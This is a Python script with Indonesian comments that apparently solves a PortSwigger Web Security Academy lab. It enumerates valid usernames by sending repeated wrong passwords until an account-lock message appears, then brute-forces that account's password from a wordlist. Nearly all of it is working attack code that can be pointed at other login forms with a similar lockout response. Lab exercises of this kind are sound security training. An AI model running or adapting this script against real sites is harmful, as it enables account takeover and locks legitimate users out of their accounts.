import requests
import sys

# Konfigurasi Target
TARGET_URL = "https://0a49009403760af6807c2bf500cc0035.web-security-academy.net/login"
USERNAME_FILE = "usernames.txt"
PASSWORD_FILE = "passwords.txt"
LOCK_MESSAGE = "You have made too many incorrect login attempts"

def get_wordlist(filename):
    try:
        with open(filename, "r") as f:
            return [line.strip() for line in f.readlines()]
    except FileNotFoundError:
        print(f"[-] File {filename} tidak ditemukan.")
        sys.exit(1)

def solve_lab():
    usernames = get_wordlist(USERNAME_FILE)
    passwords = get_wordlist(PASSWORD_FILE)
    
    valid_username = None

    print(f"[*] Memulai enumerasi username pada: {TARGET_URL}")
    print("[*] Proses ini akan mencoba membuat akun terkunci...")

    # Tahap 1: Enumerasi Username via Account Lock
    for user in usernames:
        # Kirim 5 request gagal untuk memicu lock
        # Kita menggunakan session untuk efisiensi koneksi
        s = requests.Session() 
        for i in range(5):
            data = {
                "username": user,
                "password": "wrongpassword123" # Password asal untuk memicu error
            }
            response = s.post(TARGET_URL, data=data)
        
        # Cek respon terakhir apakah akun terkunci
        if LOCK_MESSAGE in response.text:
            print(f"[+] Username ditemukan: {user}")
            valid_username = user
            break
        else:
            # Cetak progress bar sederhana agar tidak terlihat hang
            sys.stdout.write(f"\r[-] Mencoba user: {user} (Tidak terkunci)")
            sys.stdout.flush()

    if not valid_username:
        print("\n[-] Gagal menemukan username yang valid.")
        return

    print(f"\n[*] Memulai brute force password untuk user: {valid_username}")

    # Tahap 2: Brute Force Password
    for password in passwords:
        data = {
            "username": valid_username,
            "password": password
        }
        # Gunakan session baru atau reset untuk menghindari gangguan cookie lama
        response = requests.post(TARGET_URL, data=data)
        
        # Jika login berhasil, biasanya tidak ada pesan error atau di-redirect (status 302)
        # Di lab ini, kita cari ketidakhadiran pesan error umum atau pesan lock
        if "Invalid username or password" not in response.text and LOCK_MESSAGE not in response.text:
            print(f"\n[+] PASSWORD DITEMUKAN: {password}")
            print("[+] Silakan login secara manual.")
            return
        
        sys.stdout.write(f"\r[-] Mencoba password: {password}")
        sys.stdout.flush()

if __name__ == "__main__":
    solve_lab()